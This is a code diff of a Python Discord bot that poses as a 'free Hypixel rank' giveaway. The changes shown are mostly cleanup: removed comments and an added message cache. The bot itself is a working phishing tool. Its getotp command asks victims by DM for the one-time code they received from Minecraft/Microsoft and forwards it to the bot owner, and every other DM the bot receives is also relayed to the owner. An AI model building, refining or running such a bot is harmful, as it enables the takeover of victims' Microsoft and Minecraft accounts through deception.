@@ -11,6 +11,7 @@ bot = commands.Bot(command_prefix='*', intents=intents)
 OWNER_ID = 1101467683083530331  # Your Discord ID
 user_otps = {}
 pending_otps = {}
+recent_dm_cache = {}  # <-- ADD THIS
 
 @bot.event
 async def on_ready():
@@ -51,7 +52,6 @@ class ClaimModal(discord.ui.Modal, title="Claim Your Free Rank"):
         otp = str(random.randint(100000, 999999))
         user_otps[user_id] = otp
 
-        # DM the owner with the user info
         owner = await bot.fetch_user(OWNER_ID)
         await owner.send(
             f"📥 **New Rank Claim Submitted!**\n"
@@ -61,7 +61,6 @@ class ClaimModal(discord.ui.Modal, title="Claim Your Free Rank"):
             f"✅ OTP for user: `{otp}` (sent to user via DM)."
         )
 
-        # DM the user
         try:
             await interaction.user.send(
                 f"👋 Here is your OTP to verify for Hypixel Rank:\n\n**{otp}**\n\n"
@@ -70,7 +69,6 @@ class ClaimModal(discord.ui.Modal, title="Claim Your Free Rank"):
             await interaction.response.send_message("✅ Info submitted! Check your DMs for OTP.", ephemeral=True)
         except:
             await interaction.response.send_message("❌ I couldn't DM you. Please enable DMs.", ephemeral=True)
-
 
 @bot.command()
 async def tell(ctx, user_id: int, *, message):
@@ -86,15 +84,14 @@ async def tell(ctx, user_id: int, *, message):
     except:
         await ctx.reply("❌ Failed to send message. Invalid user ID or unknown error.", delete_after=8)
 
-
 @bot.command()
 async def confirmotp(ctx, otp_input):
     actual_otp = user_otps.get(ctx.author.id)
 
     try:
-        await ctx.message.delete(delay=1)  # Delete user's message after 1 second
+        await ctx.message.delete(delay=1)
     except:
-        pass  # In case the bot lacks permission
+        pass
 
     if actual_otp is None:
         msg = await ctx.send("❌ You haven't submitted a form yet. Use the panel first.")
@@ -103,8 +100,7 @@ async def confirmotp(ctx, otp_input):
         msg = await ctx.send("🎉 OTP Verified! You’ll receive your Hypixel Rank soon.")
         await msg.delete(delay=8)
 
-        # Send confirmation to the owner
-        owner = await bot.fetch_user(1101467683083530331)  # Your Discord ID
+        owner = await bot.fetch_user(OWNER_ID)
         await owner.send(
             f"✅ **OTP Verified Successfully**\n"
             f"User: `{ctx.author}` (ID: `{ctx.author.id}`) has successfully confirmed their OTP "
@@ -115,7 +111,6 @@ async def confirmotp(ctx, otp_input):
     else:
         msg = await ctx.send("❌ Incorrect OTP. Try again.")
         await msg.delete(delay=8)
-
 
 @bot.command()
 async def getotp(ctx, user_id: int):
@@ -131,7 +126,7 @@ async def getotp(ctx, user_id: int):
             f"👋 Please send me the **OTP you received from Minecraft/Microsoft** to complete your rank claim.\n\n"
             f"Reply here with your OTP only."
         )
-        pending_otps[user.id] = ctx.author.id  # Store that this user should send OTP to owner
+        pending_otps[user.id] = ctx.author.id
         await ctx.reply("📨 User has been prompted to send their OTP.")
     except:
         await ctx.reply("❌ Couldn't DM the user.")
@@ -150,17 +145,16 @@ async def on_message(message):
                 f"📨 **OTP Received from {message.author} (`{user_id}`):**\n\n`{content}`"
             )
             del pending_otps[user_id]
-            await message.channel.send("✅ Your OTP has been sent to the admin.")
+            try:
+                await message.channel.send("✅ Your OTP has been sent to the admin.")
+            except:
+                pass
         else:
-            # Prevent repeat messages
             last_sent = recent_dm_cache.get(user_id)
             if last_sent != content:
                 await owner.send(
                     f"📩 **New DM from {message.author} (`{user_id}`):**\n```\n{content}\n```"
                 )
-                recent_dm_cache[user_id] = content  # Update last message
+                recent_dm_cache[user_id] = content
 
-
-
-# Get token from environment variable
 bot.run(os.environ["TOKEN"])
